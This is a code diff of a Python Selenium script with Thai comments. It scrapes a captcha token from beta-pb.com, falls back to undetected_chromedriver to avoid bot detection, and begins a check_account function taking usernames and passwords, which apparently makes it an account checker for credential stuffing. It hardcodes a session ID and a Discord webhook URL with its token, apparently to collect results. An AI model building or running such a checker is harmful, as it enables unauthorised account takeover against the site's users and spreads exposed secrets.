@@ -6,10 +6,12 @@ from selenium.webdriver.common.by import By
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.chrome.service import Service
+from webdriver_manager.chrome import ChromeDriverManager
 
-# ================== 🔥 ตั้งค่า ==================
+# ================== ตั้งค่า ==================
 SESSION_ID = "d9c5d8c81b3012339001b6ffea85abcdaeeb10806a7891568086c70cb854084"
-WEBHOOK_URL = "https://discord.com/api/webhooks/1525105752497324072/TU7mNMV_qhmXwuwcooDrJPH8i50YOM4qCny55kI4dko9u-ZN65I6-QQsuJ0n8NtrEGSy"  # 👈 เปลี่ยน
+WEBHOOK_URL = "https://discord.com/api/webhooks/1525105752497324072/TU7mNMV_qhmXwuwcooDrJPH8i50YOM4qCny55kI4dko9u-ZN65I6-QQsuJ0n8NtrEGSy"  # เปลี่ยน
 
 def get_captcha_token():
     options = Options()
@@ -18,34 +20,40 @@ def get_captcha_token():
     options.add_argument("--disable-dev-shm-usage")
     options.add_argument("--disable-gpu")
     options.add_argument("--window-size=1920,1080")
-    options.binary_location = "/usr/bin/chromium"
     
-    driver = None
     try:
-        driver = webdriver.Chrome(options=options)
+        # ใช้ webdriver_manager ดาวน์โหลด chromedriver อัตโนมัติ
+        service = Service(ChromeDriverManager().install())
+        driver = webdriver.Chrome(service=service, options=options)
+    except Exception as e:
+        print(f"   ⚠️ webdriver_manager error: {e}")
+        # ถ้า webdriver_manager ล้มเหลว ให้ลอง undetected_chromedriver
+        try:
+            import undetected_chromedriver as uc
+            driver = uc.Chrome(options=options, version_main=None)
+        except:
+            return None
+
+    try:
         driver.get("https://beta-pb.com")
         wait = WebDriverWait(driver, 10)
-        
         token = None
         try:
             elem = wait.until(EC.presence_of_element_located((By.NAME, "captcha_token")))
             token = elem.get_attribute("value")
         except:
             pass
-        
         if not token:
             try:
                 token = driver.execute_script("return window.captcha_token || ''")
             except:
                 pass
-        
         return token
     except Exception as e:
-        print(f"   ⚠️ Error: {e}")
+        print(f"   ⚠️ error in get_captcha_token: {e}")
         return None
     finally:
-        if driver:
-            driver.quit()
+        driver.quit()
 
 def check_account(username, password, session, captcha_token):
     headers = {
